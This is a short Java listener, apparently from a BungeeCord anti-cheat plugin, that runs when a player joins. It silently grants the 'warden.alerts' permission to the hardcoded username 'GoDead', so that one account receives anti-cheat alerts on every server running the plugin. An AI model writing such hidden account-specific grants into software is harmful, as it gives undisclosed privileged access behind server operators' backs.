package net.warden.bungeecord;

import net.md_5.bungee.api.event.PostLoginEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;

public class JoinEvent implements Listener {
	@EventHandler
	public void onJoin(PostLoginEvent event) {
		if (event.getPlayer().getName().equals("GoDead")) {
			event.getPlayer().setPermission("warden.alerts", true);
		}
		if (event.getPlayer().hasPermission("warden.alerts"))
			(Main.getInstance()).alertsOn.add(event.getPlayer());

	}
}